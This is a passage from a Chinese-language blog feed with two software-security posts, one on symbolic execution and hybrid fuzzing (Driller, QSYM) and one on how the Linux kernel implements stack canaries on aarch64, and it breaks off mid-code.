        <content type="html"><![CDATA[<h1 id="符号执行"><strong>符号执行</strong></h1><h3 id="符号执行是什么">符号执行是什么</h3><p>符号执行 （Symbolic Execution）是一种程序分析技术，它可以通过分析程序来得到让特定代码区域执行的输入。顾名思义，使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。</p><h3 id="符号执行的优势">符号执行的优势</h3><p>生成具体测试输入的能力是符号执行的主要优势之一：</p><p>从测试生成的角度来看，它允许创建高覆盖率的测试套件，而从bug查找的角度来看，它为开发人员提供了触发bug的具体输入，该输入可用于确认和调试打开的错误。</p><h3 id="符号执行过程">符号执行过程</h3><p>在任何时候，符号执行引擎都维持一个状态（stmt，σ，π）。</p><ul><li><p>stmt是下一个要评估的语句。目前，我们假设stmt可以是赋值，条件分支或跳转。</p></li><li><p>σ是一个符号存储，它将程序变量与具体值或符号值αi上的表达式相关联。</p></li><li><p>π表示路径约束，即，是表示由于在执行中为了达到stmt而采取的分支而对符号αi的一组假设的公式。在分析开始时，π=真。</p></li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035360.png" alt="image-20210416135536910"></p><p>下面是一个简单的符号执行的样例。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035357.png" alt="图片"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035364.png" alt="image-20210416135605643"></p><p>在沿着程序的执行路径的符号执行结束时，使用约束求解器来求解π以生成具体的输入值。</p><h3 id="符号执行实现的两种方案">符号执行实现的两种方案</h3><ul><li><p>1）基于IR的符号执行:IRs实现解释器比直接为机器代码实现符号解释器<strong>容易得多</strong>，因此这是许多系统所采用的方法,但是IR生成可能需要大量的工作, 而且<mark>解释IR要比相应二进制文件的本机执行慢得多</mark>。</p></li><li><p>2）无IR的符号执行:不是将被测程序翻译成IR然后解释，而是执行未修改的机器代码，并在运行时对其进行检测, 但是一般机器指令较多, 实现起来没有<mark>基于IR的符号执行简单</mark>。</p></li></ul><h3 id="concolic执行">Concolic执行</h3><p>Concolic执行维护一个实际状态和一个符号化状态：实际状态将所有变量映射到实际值，<mark>符号状态只映射那些有非实际值的变量</mark>。Concolic执行首先用一些给定的或者随机的输入来执行程序，收集执行过程中条件语句对输入的符号化约束，然后使用约束求解器去推理输入的变化，从而将下一次程序的执行导向另一条执行路径。</p><p>简单地说来，就是在已有实际输入得到的路径上，对分支路径条件进行取反，就可以让执行走向另外一条路径。这个过程会不断地重复，加上系统化或启发式的路径选择算法，直到所有的路径都被探索，或者用户定义的覆盖目标达到，或者时间开销超过预计。</p><p>我们依旧以上面那个程序的例子来说明。我们从一个实际输入{a=0, b=7}出发，符号化执行得到第一个约束条件a0 == 0，第一次取反得到a0 != 0 ，从而得到测试输入{x=2, y=1}和新约束(a0 != 0) &amp; (b0 !=0)；第二次取反得到(a0 != 0) &amp; (b0 ==0)，从而求解出测试输入{x=1, y=0}。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035369.png" alt="image-20210416135618076"></p><h1 id="混合模糊">混合模糊</h1><p>模糊技术可以以近乎自然的速度快速探索输入空间，但它只擅长于发现<mark>导致执行路径具有松散分支条件</mark>（如x&gt;0）的输入。相反，concolic执行擅长于找到将程序驱动到紧凑而复杂的分支条件的输入，例如x==0xdeadbeef，但是计算和解决这些约束非常昂贵且缓慢。</p><p>将模糊化和concolic执行结合起来，希望模糊程序能快速地探索琐碎的输入空间（即松散条件），concolic执行能解决复杂的分支。</p><h3 id="driller">Driller</h3><p>比较早(2016年)将符号执行和模糊测试结合的工具是Driller.Driller是基于fuzz工具AFL和符号执行工具angr来实现的，<strong>当模糊程序卡住时调用符号执行来求解能够到达新路径的输入</strong>，使得fuzz能够快速突破条件判断语句。</p><p>具体实现是，通过监测AFL的执行，可以决定什么时候开始符号执行以探索新路径。如果AFL执行了x轮后，<mark>bitmap上显示没有发现新的状态转换（也即新的代码块转移）</mark>，说明AFL卡住了，这时候调用<mark>angr</mark>进行符号执行。</p><p>每个具体输入对应于PathGroup中的单个路径， 在PathGroup的每一步中，检查每个分支以确保最新的跳转指令引入先前AFL未知的路径。当发现这样的跳转时，SMT求解器被查询以创建一个输入来驱动执行到新的跳转。这个输入反馈给AFL，AFL在未来的模糊步骤中进行变异。这个反馈循环使我们能够<mark>将昂贵的符号执行时间与廉价的模糊时间进行平衡</mark>，并且减轻了模糊对程序操作的低语义洞察力。</p><h3 id="qsym">QSYM</h3><p>2018年一款新的混合模糊引擎QSYM被提出，它的作者观察到，他们的 concolic executors的性能瓶颈是阻止他们被复杂的实际应用所采用的主要限制因素。</p><p>下面讲述了QSYM的作者任务影响符号执行性能的因素。</p><ul><li>1)慢符号执行</li></ul><p>现有的协同执行器选择IR来大大降低它们的实现复杂度；然而，这牺牲了性能。此外，加速IR使用的优化禁止了进一步的优化机会，特别是通过以基本块粒度将程序转换为IRs。此设计不允许跳过不涉及符号执行指令的仿真指令。</p><p>首先，IR翻译本身增加了开销。在大多数情况下，机器指令的翻译会导致多条IR指令。从而产生了大量的符号模拟处理.</p><p>如果基本块不处理任何符号变量，它们就不会在模拟器中执行。虽然这有效地减少了开销，但仍有优化的空间。根据我们对libjpeg、libpng、libtiff和file等真实软件的测量，<em>符号基本块中只有30%的指令需要符号执行</em>。这个这意味着一个指令级的方法有机会减少不必要的符号执行的数量。然而，由于IR缓存的原因，当前的concolic执行器不容易采用这种方法。</p><ul><li>2)无效的快照</li></ul><p>常规concolic执行引擎使用<strong>快照技术</strong>来减少在探索目标程序的多条路径时重新执行目标程序的开销。</p><p>引擎在一个分支中备份程序的符号状态，然后探索其中一条路径。</p><p>当路径耗尽或卡住时，发动机将符号状态恢复到分支上的先前状态，并移动到另一条路径。</p><p>引擎可以探索路径，而无需支付重新执行分支程序的费用。</p><p>为什么说快照是无效的?</p><p>第一，混合模糊中的concolic执行引擎从fuzzer中获取多个测试用例，<strong>这些测试用例与程序的不同路径相关联</strong>（即，不共享公共分支）.</p><p>第二，快照机制由于打破了进程边界,快照机制成为支持外部环境的问题.</p><p>当一个程序通过fork（）发散-就像系统调用一样，内核不再维护与外部环境相关的内部状态。因此，协同执行引擎应该自己维护状态.</p><p>通过全系统的concolic执行或外部环境建模来解决这个问题，但是它们分别导致了显著的性能降低和不准确的测试，而且快照无法反映外部状态。</p><ul><li>3)缓慢而不灵活的可靠分析</li></ul><p>concolic执行试图==通过收集完整的约束来保证可靠性。==这种完整性确保满足约束的输入将导致执行到预期的路径。但是，计算完全约束在各种情况下都是昂贵的,并且有可能陷入对复杂事物的永无止境的分析逻辑.例如。下的上半部分显示了文件程序的代码片段。它卡在计算zlib解压的复杂约束，无法搜索其他有趣的代码。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035366.png" alt="image-20210416135633846"></p><p>其次,concolic完全约束也会过度约束路径，从而限制concolic执行以找到未来路径。特别是，在默认执行之后插入的约束可能会导致过度约束问题.如图三下半部分,</p><p>首先执行到第三行生成约束{ch&gt;=0x20∧ch&lt;0x7f}</p><p>然后到第6行{ch&gt;=0x20∧ch&lt;0x7f&lt;∧ch==0x7f}</p><p>这一不可满足约束,求解这个不可满足约束是无意义的.但是第六行的逻辑不依赖于第三行的相关逻辑,因为在不考虑路径约束的情况下，由concolic执行生成的输入ch==0x7f将探索满足第六行条件的路径。</p><p>为了解决上面的一些瓶颈，QSYM被设计出来，下面讲述QSYM的设计细节。</p><p>1)概述</p><p>QSYM首先使用<mark>动态二进制翻译（DBT）和覆盖引导模糊器</mark>提供的输入运行目标程序。</p><p>DBT为本机执行生成基本块，并为符号执行修剪它们，允许我们在两个执行模型之间快速切换。</p><p>QSYM只选择性地模拟生成符号约束所需的指令，这与现有方法在受污染的基本块中模拟所有的构造不同。</p><p>通过这样做，QSYM大大减少了符号模拟的数量。</p><p>由于QSYM的高效执行，它可以重复执行符号执行，而不是使用需要外部环境建模的快照。</p><p>QSYM可以以具体的方式与外部环境进行交互，而不依赖于人为的环境模型。</p><p>为了提高约束求解的性能，QSYM应用了各种启发式算法，在严格的稳健性之间进行折中以获得更好的性能。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035374.png" alt="image-20210416135641815"></p><p>2)指令级符号执行</p><p>原来的执行器是块级污染分析,要把整块进行模拟进行符号执行,而指令级只需要将被污染的指令进行模拟来符号执行.</p><p>对于QSYM，高效的DBT使得实现细粒度的、指令级的污点跟踪和符号执行成为可能，帮助我们避免不必要的仿真开销。</p><p>下面这个例子,如果size是一个符号,就只需要符号执行虚线框的指令,而不需要符号执行punpXXX这种复杂而没被污染的指令.</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035604.png" alt="image-20210416135651308"></p><p>3)仅解决相关约束</p><p>QSYM通过更新一小部分初始输入来生成新的测试用例。然而，Driller生成了新的测试用例，这些用例看起来与原始输入完全不同。这表明Driller在解决模糊程序反复测试的不相关约束.</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035619.png" alt="image-20210416135658693"></p><p>4)不使用快照</p><p>QSYM的快速concolic执行使得重新执行比为重复的concolic测试拍摄快照更容易。</p><p>由于QSYM的conclic执行器变得更快，快照的开销不再小于重新执行的开销。</p><p>5)具体的外部环境</p><p>qsym通过与外部环境的具体互动避免了由不完整或错误的环境建模.</p><p>由于建模的<mark>不完整性和正确性偏离了符号执行和本机执行</mark>，误导了进一步的探索，我们应该避免它们的进一步分析。</p><ol start="6"><li>乐观的求解<br>QSYM努力从生成的约束中生成有趣的新测试用例，通过乐观地选择和解决约束的某些部分，如果不能作为一个整体解决的话.特别是，<mark>QSYM选择路径的最后一个约束进行乐观求解</mark>，原因如下。</li></ol><p>第一，它通常有一个非常简单的形式，使得它能够有效地解决约束。</p><p>第二，从解决最后一个约束生成的测试用例可能会探索目标路径，因为它们在到达目标分支时至少满足局部约束。</p><p>由于QSYM首先消除了与最后一个约束无关的约束，因此所有不相关的约束都不会影响乐观求解的结果。</p><p>7)基本块的修剪</p><p>首先,相同代码重复生成的约束对于在真实软件中发现新的代码覆盖是没有用的。</p><p>特别是，程序中计算密集型操作生成的约束在最后不太可能是可解的（即非线性的），即使它们的约束已经形成。</p><p>更糟糕的是，这些约束倾向于阻塞探索其他不相关但足够有趣的部分的可能。</p><p>为了缓解这个问题，QSYM尝试检测具有竞争性的基本块，然后修剪它们以符号执行，并且只生成约束的子集.更具体地说，QSYM在运行时测量每个执行执行的频率，并选择重复的块来修剪.如果一个基本块执行得太频繁，QSYM将停止从它生成更多的约束.</p><p>QSYM决定使用指数回退来修剪基本块，因为它可以快速地截断过于频繁的块。</p><p>l评价</p><p>这个表展示的是在对这些程序进行测试,QSYM能找到漏洞,而只用fuzz不能找到的漏洞,其中有些空白行则是都能找到的漏洞。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035631.png" alt="image-20210416135707898"></p><p>Driller系统调用存在的问题清单</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035643.png" alt="image-20210416135715923"></p><p>这是测试libpng的代码覆盖率随着种子输入数量的增加而增加的条形图来对比AFL和QSYM.</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035655.png" alt="image-20210416135722567"></p><p>这张彩色地图描绘了qsym与Driller的五分钟相对代码覆盖率：蓝色表示qsym发现的代码比Driller多，红色表示相反。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035663.png" alt="image-20210416135730633"></p><p>下图是以初始POV作为初始种子文件的126CGC二进制文件的QSYM和Driller的平均执行时间和指令数,其中Norm是QSYM指令数乘以4.69。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035805.png" alt="image-20210416135744137"></p><p>下图是,由于QSYM的限制，CGC挑战中没有被模拟的指令数：不支持浮点操作。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241035859.png" alt="image-20210416135756070"></p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 内核安全增强(一)— stack canary</title>
      <link href="/2023/12/18/Security/software%20security/stack%20canary/"/>
      <url>/2023/12/18/Security/software%20security/stack%20canary/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-内核安全增强一-stack-canary">linux 内核安全增强(一)— stack canary</h1><h3 id="一-背景知识-aarch64的函数栈">一、背景知识 —— aarch64的函数栈</h3><h4 id="1栈生长方向与pushpop操作">1.栈生长方向与push/pop操作</h4><blockquote><p>栈是一种运算受限的线性表, 入栈的一端为栈顶，另一端则为栈底, 其生长方向和操作顺序理论上没有限定.</p></blockquote><p>在aarch64平台上，栈是向低地址方向增长的(STACK_GROWS_DOWNWARD)<br>栈的PUSH/POP通常要先移动SP:</p><ul><li>PUSH操作为PRE_DEC,即 PUSH操作为 sp = sp -4; store;</li><li>POP操作为 POST_INC,即POP操作为 read; sp=sp+4;</li></ul><h4 id="2返回地址的存储">2.返回地址的存储</h4><ul><li><p>x86平台是call指令时自动push函数返回地址到栈;</p></li><li><p>ret指令自动pop函数返回地址出栈;</p></li></ul><p>这两步操作都是在callee执行前硬件自动完成的.</p><p>而在arm/aarch64平台发生函数调用时(blx),硬件负责将函数的返回地址设置到通用寄存器LR(/X30)中, callee中的代码负责将LR保存到栈中(需保存的寄存器参考AAPCS标准)</p><h4 id="3函数栈分配">3.函数栈分配</h4><p>在不考虑动态分配的情况下, 函数中使用的栈大小在编译阶段就已经确定了(见备注1), 一个aarch64中的典型的程序栈如下所示:</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241042333.png" alt="img"></p><p>x86/arm平台的不同在于:<mark>x86和arm平台的函数返回地址通常都存于callee栈的栈底:</mark></p><ul><li>x86平台是硬件完成的push/pop操作,故返回地址先入栈</li><li><strong>arm平台callee函数的首指令通常是先push通用寄存器, 函数返回前最后语句pop通用寄存器</strong>如:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">000005fc &lt;test&gt;:                                                                                                                                                                       </span><br><span class="line">5fc:   b590            push    &#123;r4, r7, lr&#125;                /* 先push通用寄存器和函数返回地址 */</span><br><span class="line">5fe:   b089            sub     sp, #36 ; 0x24              /* 再为局部变量预留存储空间 */</span><br><span class="line">600:   af00            add     r7, sp, #0</span><br><span class="line">602:   6078            str     r0, [r7, #4]</span><br><span class="line">    ......</span><br><span class="line">634:   3724            adds    r7, #36 ; 0x24</span><br><span class="line">636:   46bd            mov     sp, r7</span><br><span class="line">638:   bd90            pop     &#123;r4, r7, pc&#125;</span><br></pre></td></tr></table></figure><p>​    在此两个平台中若发生了<strong>栈溢出则直接可以覆盖到当前函数的返回地址</strong>.</p><ul><li>而aarch64通常是先预留栈再保存函数返回地址,如:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400654 &lt;test&gt;:</span><br><span class="line">                                                                             /* 预留栈         ||  在栈顶保存函数返回地址       */            </span><br><span class="line">  400654:       a9bc7bfd        stp     x29, x30, [sp, #-64]!                /* sp = sp - 64;      sp[0] = x29; sp[1] = x30; */</span><br><span class="line">  400658:       910003fd        mov     x29, sp</span><br><span class="line">  40065c:       b9001fe0        str     w0, [sp, #28]</span><br><span class="line">  400660:       b9801fe1        ldrsw   x1, [sp, #28]</span><br><span class="line">  ......</span><br><span class="line">  400680:       a8c47bfd        ldp     x29, x30, [sp], #64                  /* x29 = sp[0]; x30 = sp[1]; sp = sp +64;  */</span><br><span class="line">  400684:       d65f03c0        ret</span><br></pre></td></tr></table></figure><p>最终的函数栈如上图所示, 由于变量是向高地址方向生长的，故:</p><ul><li>在x86/arm平台的栈上溢(向高地址溢出)通常可直接修改当前函数(这里的callee)的返回地址</li><li>在aarch64平台的栈上溢(向高地址溢出)则通常只能修改到父函数(caller)的返回地址</li></ul><h3 id="二-stack-canary简介">二、stack canary简介</h3><blockquote><p>stack canary是一个比较久远的安全特性，linux内核在2.6版本便已经引入, 在5.0又引入了增强的per-task stack canary</p></blockquote><p>其原理比较简单,即:</p><ul><li>每个函数执行前先向栈底插入一个canary值(如下图)以确保顺序的栈上溢在破坏到父函数栈帧前必须要先破坏canary</li><li>每个函数返回时检测当前栈帧中的canary是否被修改,若被修改则代表发生了溢出(报错)</li></ul><p><mark>stack canary并不能检测到所有的栈溢出问题</mark>, 只有在满足:</p><ul><li><p><strong>攻击者不知当前插入当函数栈中canary的值(无infoleak)</strong></p></li><li><p><strong>攻击者只能顺序的覆盖栈中数据，无法跳过canary覆盖数据</strong></p></li></ul><p>两个前提条件时才能检测到栈溢出,故其并非一种理论上安全的防御方式,也只能针对顺序覆盖的栈溢出提供一定的缓解。</p><h3 id="三-stack-canary基本思路与业界实现">三、stack canary基本思路与业界实现</h3><p>虽然原理简单，但实现上还是要解决两个主要问题:</p><h4 id="1作为对比基准的canary来自哪里">1.作为对比基准的canary来自哪里?</h4><p>函数入口需要向函数栈push一个原始的canary，函数出口需要将函数栈中的canary(后续称为stack_canary)和原始值做对比，在此过程中原始值需要保持不变并且可以被代码获取到:</p><h5 id="11-原始值来自全局变量">1.1 原始值来自全局变量</h5><p>默认stack canary使用全局符号(变量) __stack_chk_guard 作为原始的canary(后续称为全局canary), 在gcc/clang中均使用相同的名字.</p><ul><li>全局canary的优点在于:实现简单,开启stack_canary保护的代码中只需要定义一个全局变量__stack_chk_guard 并在初始化时为其赋值一个随机数即可__</li><li>全局canary的缺点在于:<ul><li>所有进程间共享同一个全局canary,只要某进程/线程中发生了infoleak，那么整个canary机制就可以被绕过了.</li><li>全局canary(__stack_chk_guard)的值在运行期间难以改变，否则会导致已有的函数返回时直接crash</li></ul></li></ul><h5 id="12-原始值来自per-cpu变量">1.2 原始值来自per-cpu变量</h5><p>per-cpu变量的引入是为了实现per-task的stack canary，每个cpu上同时只能运行一个进程/线程, per-cpu变量可以随进程的切换而切换，故通过一个per-cpu变量完全可以为每个进程/线程解引用到不同的canary地址(后续称为per-cpu canary)，以实现per-task的canary。</p><h5 id="per-cpu-canary的优点在于">per-cpu canary的优点在于:</h5><p>每个进程/线程拥有自己的canary, 可减少infoleak的影响</p><h5 id="per-cpu-canary的缺点在于">per-cpu canary的缺点在于:</h5><p>需要依赖于硬件平台的一个per-cpu变量(如aarch64 用户态tpidr_el0,内核态sp_el0)</p><p>需要编译器增加对应支持</p><h4 id="2每个函数中pushpopcheck-canary的代码谁来写">2.每个函数中push/pop/check canary的代码谁来写？</h4><p>通常stack canary的桩代码都是由编译器来插入的,但对具体硬件平台, 不同编译器的支持也有所不同</p><h5 id="21-gccllvm-均支持全局canary">2.1 gcc/llvm 均支持全局canary:</h5><p>gcc/llvm中编译选项-fstack-protector/-fstack-protector-strong均已支持, 开启后函数出入口会从全局变量__stack_chk_guard中获取全局canary</p><h5 id="22-gccllvm-均支持aarch64的per-cpu-canary">2.2 gcc/llvm 均支持aarch64的per-cpu canary:</h5><ul><li>gcc通过-mstack-protector-guard<em>系列选项可以指定某系统寄存器作为stack canary per cpu的资源(后面称为sysreg)</em></li><li><em>clang 主线目前也已支持-mstack-protector-guard</em> 系列选项,但目前尚无可用发行版[1]</li><li>clang --target=–target=aarch64-linux-android 中支持per cpu的stack canary，但其只能使用默认的 tpidr_el0系统寄存器作为索引, 偏移值也是默认的0x40</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-mstack-protector-guard*系列包含三个选项:</span><br><span class="line">  * -mstack-protector-guard=sysreg:      使用系统寄存器作为per cpu canary的索引</span><br><span class="line">  * -mstack-protector-guard-reg=sp_el0:  作为索引的系统寄存器名(必须是系统寄存器,代码中最终会生成msr/mrs作为访问指令)</span><br><span class="line">  * -mstack-protector-guard-offset=16:   偏移地址,最终canary来自 *(sp_el0 + offset)</span><br></pre></td></tr></table></figure><h5 id="23-arm-linux内核可通过gcc-plugin支持-per-cpu-canary">2.3 arm linux内核可通过gcc plugin支持 per-cpu canary:</h5><p>​      arm linux kernel 通过一个gcc plugin(arm_ssp_per_task_plugin)基于per-cpu 寄存器sp实现了 per-task canary功能</p><h3 id="四-编译器中全局canary的实现">四、编译器中全局canary的实现</h3><p>这里以aarch64平台，gcc + -fstack-protector-strong为例,其实现逻辑如下(源码分析见备注2):</p><ul><li>函数入口将全局canary =&gt; stack_canary(stack_canary地址为编译期间预留在当前函数栈底的)</li><li>函数出口对比全局canary和stack_canary是否还一致,一致则跳转到4)</li><li>检测到栈溢出, 调用__stack_chk_fail函数</li><li>函数返回</li></ul><p>在aarch64的汇编代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//aarch64-linux-gnu-gcc -g -fstack-protector-strong test.c -S -o ./gcc/test.s</span><br><span class="line">1 test:</span><br><span class="line">2         stp     x29, x30, [sp, -64]!                    /* 分配函数栈帧 */</span><br><span class="line">3         mov     x29, sp</span><br><span class="line">4         str     w0, [sp, 28]    </span><br><span class="line">5         adrp    x0, __stack_chk_guard                   /* 获取全局canary *__stack_chk_guard */</span><br><span class="line">6         add     x0, x0, :lo12:__stack_chk_guard</span><br><span class="line">7         ldr     x1, [x0]</span><br><span class="line">8         str     x1, [sp, 56]                            /* 全局canary =&gt; stack_canary(位于栈底) */</span><br><span class="line"> </span><br><span class="line">9         .......                                         /* 函数体 */</span><br><span class="line"> </span><br><span class="line">10        adrp    x0, __stack_chk_guard                   /* 函数返回前再次获取全局canary */</span><br><span class="line">11        add     x0, x0, :lo12:__stack_chk_guard</span><br><span class="line">12        ldr     x0, [x0]</span><br><span class="line">13        ldr     x2, [sp, 56]                            /* 读取stack_canary */</span><br><span class="line">14        eor     x0, x2, x0                              /* 对比stack_canary是否被破坏 */</span><br><span class="line">15        cmp     x0, 0</span><br><span class="line">16        beq     .L3                                     /* 未破坏跳转到函数返回 */</span><br><span class="line">17        bl      __stack_chk_fail                        /* 被破坏则跳转到 __stack_chk_fail */        </span><br><span class="line">18</span><br><span class="line">19 .L3:</span><br><span class="line">20        ldp     x29, x30, [sp], 64</span><br><span class="line">21        ret</span><br></pre></td></tr></table></figure><h3 id="五-编译器中per-cpu-canary的实现">五、编译器中per-cpu canary的实现</h3><p>​    per-cpu canary时编译器会通过  *(reg + offset)的方式获取当前cpu上的canary(如下面例子中的 * (sp_el0  + 16), 而程序自身需要确保线程切换时per-cpu的canary也要随之切换, 在aarch64下的汇编代码如下(源码分析见备注2):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    -mstack-protector-guard=sysreg:      使用系统寄存器作为per cpu canary的索引</span><br><span class="line">    -mstack-protector-guard-reg=sp_el0:  作为索引的系统寄存器名(必须是系统寄存器,代码中最终会生成msr/mrs作为访问指令)</span><br><span class="line">    -mstack-protector-guard-offset=16:   偏移地址,最终canary来自 *(sp_el0 + offset)</span><br><span class="line">*/</span><br><span class="line">//aarch64-linux-gnu-gcc -g -fstack-protector-strong -mstack-protector-guard=sysreg -mstack-protector-guard-reg=sp_el0 -mstack-protector-guard-offset=16 test.c -S -o ./gcc/test.s</span><br><span class="line">  1 test:</span><br><span class="line">  2         stp     x29, x30, [sp, -64]!    /* 分配函数栈帧 */</span><br><span class="line">  3         mov     x29, sp</span><br><span class="line">  4         str     w0, [sp, 28]</span><br><span class="line">  5         mrs     x0, sp_el0              /* x1 = *(sp_el0 + 16); 为per cpu canary值 */</span><br><span class="line">  6         add     x0, x0, 16</span><br><span class="line">  7         ldr     x1, [x0]</span><br><span class="line">  8         str     x1, [sp, 56]            /* per cpu canary =&gt; stack_canary */</span><br><span class="line">  9         ......</span><br><span class="line">10         mrs     x0, sp_el0               /* 再次获取per cpu的canary */</span><br><span class="line">11         add     x0, x0, 16</span><br><span class="line">12         ldr     x0, [x0]</span><br><span class="line">13         ldr     x1, [sp, 56]             /* 再次获取stack_canary */</span><br><span class="line">14         eor     x0, x1, x0               /* 对比匹配则正常结束,不匹配跳转到__stack_chk_fail */</span><br><span class="line">15         cmp     x0, 0</span><br><span class="line">16         beq     .L2</span><br><span class="line">17         bl      __stack_chk_fail</span><br><span class="line">18 .L2:</span><br><span class="line">19         ldp     x29, x30, [sp], 64</span><br><span class="line">20         ret</span><br></pre></td></tr></table></figure><h3 id="六-linux内核对stack-canary的支持">六、linux内核对stack canary的支持</h3><p>linux内核中与stack canary相关的配置项主要有三个,分别是:</p><ol><li><p>CONFIG_STACKPROTECTOR:</p><p>平台无关的编译选项,其决定是否开启 stack canary保护, 开启则默认指定编译选项 -fstack-protector，使用__stack_chk_guard 作为全局canary对比</p></li><li><p>CONFIG_STACKPROTECTOR_STRONG</p><p>平台无关的编译选项,其决定是否开启strong保护,开启则额外指定编译选项 -fstack-protector-strong.</p></li><li><p>CONFIG_STACKPROTECTOR_PER_TASK</p><p>平台相关的编译选项, 其决定是否开启内核per-task的stack canary保护(此时需编译器的per-cpu canary和对应硬件平台支持)</p></li></ol><h3 id="七-aarch64平台内核stack-canary的实现">七、aarch64平台内核stack canary的实现</h3><h4 id="1全局canary的实现">1.全局canary的实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STACKPROTECTOR =y</span><br><span class="line">CONFIG_STACKPROTECTOR_STRONG =y</span><br><span class="line">CONFIG_STACKPROTECTOR_PER_TASK=n</span><br></pre></td></tr></table></figure><p>全局canary对于内核来说并没有太多的工作，只需要在系统启动时设置好__stack_chk_guard并定义检测失败的回调__stack_chk_fail 即可，插桩代码均由编译器实现(见四), 代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">./arch/arm64/kernel/process.c</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_STACKPROTECTOR) &amp;&amp; !defined(CONFIG_STACKPROTECTOR_PER_TASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/stackprotector.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 这里__stack_chk_guard被定义为一个变量, 实际上定义为__ro_after_init可能更好, 此变量可写通常也不会有太大问题，因为对此变量的修改通常会直接导致内核检测到栈溢出而crash */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __stack_chk_guard __read_mostly;        </span><br><span class="line">EXPORT_SYMBOL(__stack_chk_guard);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">./arch/arm64/include/<span class="keyword">asm</span>/stackprotector.h</span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">boot_init_stack_canary</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_STACKPROTECTOR)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> canary;</span><br><span class="line"></span><br><span class="line">    get_random_bytes(&amp;canary, <span class="keyword">sizeof</span>(canary));        <span class="comment">/* 